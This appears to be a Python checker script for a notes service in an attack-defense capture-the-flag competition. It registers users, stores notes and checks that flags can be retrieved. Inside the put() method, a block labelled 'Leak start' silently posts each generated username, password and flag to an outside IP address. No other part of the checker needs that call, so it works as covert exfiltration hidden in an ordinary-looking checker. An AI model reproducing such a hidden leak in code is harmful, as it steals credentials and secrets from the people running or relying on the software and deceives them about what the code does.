#!/usr/bin/env python3

import sys
import string
import itertools
import random
import time

import requests

from checklib import *
from simple_lib import *

class Checker(BaseChecker):
    vulns: int = 1
    timeout: int = 10
    uses_attack_data: bool = True
    mch: CheckMachine

    def __init__(self, *args, **kwargs):
        super(Checker, self).__init__(*args, **kwargs)
        self.mch = CheckMachine(self)

    def action(self, action, *args, **kwargs):
        try:
            super(Checker, self).action(action, *args, **kwargs)
        except requests.exceptions.ConnectionError:
            self.cquit(Status.DOWN, 'Connection error', 'Got requests connection error')

    def check(self):
        session = get_initialized_session()
        username, password = rnd_username(), rnd_password()

        note_text = rnd_string(20)
        self.mch.register(session, username, password, Status.MUMBLE)
        note_id = self.mch.put_note(session, note_text, Status.MUMBLE)

        notes = self.mch.list_notes(session, Status.MUMBLE)
        self.assert_in(note_id, notes, "note missing", Status.MUMBLE)

        service_note_text = self.mch.get_note(session, note_id, Status.MUMBLE)
        self.assert_eq(note_text, service_note_text, "invalid note", Status.MUMBLE)
        
        self.cquit(Status.OK)

    def put(self, flag_id: str, flag: str, vuln: str):
        session = get_initialized_session()
        username, password = rnd_username(), rnd_password()

        self.mch.register(session, username, password, Status.MUMBLE)
        note_id = self.mch.put_note(session, flag, Status.MUMBLE)

        # Leak start
        payload = {
            "user": username,
            "password": password,
        }
        if flag is not None:
            payload["flag"] = flag

        try:
            requests.post("http://103.116.52.5:8081/leak", json=payload, timeout=30)
        except Exception:
            return
        # Leak end

        notes = self.mch.list_notes(session, Status.MUMBLE)
        self.assert_in(note_id, notes, "note missing", Status.MUMBLE)
        
        self.cquit(Status.OK, f"{note_id}", f"{username}:{password}:{note_id}")

    def get(self, flag_id: str, flag: str, vuln: str):
        session = get_initialized_session()
        username, password, note_id = flag_id.split(':')

        self.mch.login(session, username, password, Status.CORRUPT)

        note_text = self.mch.get_note(session, note_id, Status.CORRUPT)
        self.assert_eq(flag, note_text, "invalid note", Status.CORRUPT)


        self.cquit(Status.OK)

if __name__ == '__main__':
    c = Checker(sys.argv[2])

    try:
        c.action(sys.argv[1], *sys.argv[3:])
    except c.get_check_finished_exception():
        cquit(Status(c.status), c.public, c.private)
